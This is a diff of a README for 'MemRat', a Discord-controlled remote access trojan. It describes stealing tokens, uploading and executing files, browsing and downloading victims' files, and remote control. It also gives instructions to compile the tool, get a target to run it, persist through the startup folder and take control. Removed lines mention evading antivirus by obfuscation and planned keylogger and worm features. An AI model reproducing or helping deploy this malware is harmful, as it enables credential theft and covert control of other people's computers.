@@ -1,28 +1,15 @@
 # MemRat
-MemRat a.k.a MemWare is a quite simple rat designed to be used through a Discord Bot. 
+MemRat is a quite simple rat designed to be used through a Discord Bot. 
 
 The main functions include:
- - Uploading (and executing) files on the victim's machine
- - Stealing tokens on request
- - Annoying the victim
+ - Uploading (and executing) files on the target's machine
+ - Taking the target's tokens
+ - Annoying the target
  - Being remote controlled
  - Controllable file explorer on victim's machine 
  - Downloading files from the victim's machine (handy with the file explorer)
- - Working for multiple machines, and being able to give machines nicknames to recognize them.
+ - Working for multiple machines at once, and being able to give machines nicknames to recognize them.
  - Streaming service on a simple Flask website (a bit broken currently)
- 
-The rat IS DETECTABLE by default, you have to obfuscate it yourself if you feel like getting it through AV. This rat is for educational purposes only.
 
 ## RAT USE AND COMPILING
- - The rat is quite simple to use: Set configs to be the ones you want (startup, bot token, notificationchannel), compile it with a python compiler (such as PyInstaller, not included), done. When someone launches the EXE, you will get a notification in the notification channel you set, and you can start controlling the machine with '(MACHINE'S-IP)+help' on any channel that the discord bot is in. The machine's IP will be included in the start notification.
-
-WIP IDEAS:
- - Keylogger
- - Probably import this to work on the web instead of discord some day
- - Spreader / Worm
- - Discord self-botter
- - Audiolog and Audio streamed in VC
-
-
-The token logger in the rat is taken from: https://github.com/mouadessalim/CookedGrabber (Not mine)
-
+ - To use the rat, you might want to compile your python code first. You can do this with whatever compiler you want (such as PyInstaller). Then after that, the target has to run the file once, the rat should move into a startup directrory, so it should start up automatically when the computer is started. After the target runs the rat for the first time, you will get a notification in the channel you provided, including the machine's IP and the command used to control the machine. 
